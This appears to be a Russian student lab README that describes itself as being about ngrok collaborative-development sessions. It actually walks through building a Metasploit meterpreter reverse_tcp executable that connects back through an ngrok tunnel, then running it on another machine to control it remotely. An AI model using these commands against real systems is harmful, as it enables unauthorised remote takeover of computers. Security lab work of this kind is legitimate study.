# lab-11
# Данная лабораторная работа посвещена изучению процесса создания сеансов совместной разработки с использованием инструмента ngrok   
1. Зайдём на сайт ngrok.com пройдем регистрацию и скопируем ссылку для подключения аккаунта через консоль.   


2. Выполним команду:   
``` $ ./ngrok tcp 9999 ```   
9999 - это порт   

![image](https://github.com/Fedorusita/lab-11/assets/112895410/240db9c1-7c7d-436a-9755-f21dfb1b824a)   

3.Откроем новую консоль и пропишем туда:   
``` $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=7.tcp.eu.ngrok.io LPORT=17410 -f exe > payloap.exe ```   

![image](https://github.com/Fedorusita/lab-11/assets/112895410/12873e0a-c2e5-4a8d-8726-f55c00967e14)   

4. Заключительная настройка:
 ``` $ msfconsole ```   
 
 ![image](https://github.com/Fedorusita/lab-11/assets/112895410/06f0b51c-dcce-47ea-be44-5fd59ed88974)   
 
 ![image](https://github.com/Fedorusita/lab-11/assets/112895410/042c0fe1-0e3a-40e4-a735-5ff49f359656)   
 
 ![image](https://github.com/Fedorusita/lab-11/assets/112895410/ca28044b-61b6-45b5-8bee-b25028da3ea1)   
 
 5. Теперь файл payloap.exe запустим на другой машине.   
 Отлично, теперь мы можем управлять машиной, где запущен этот файл с другого компьютера.   
 
 ``` calc ```   
 
 На целевой машине:   
 
 ![image](https://github.com/Fedorusita/lab-11/assets/112895410/7596b3b3-1e14-4b82-89eb-abdf91a007b0)




 



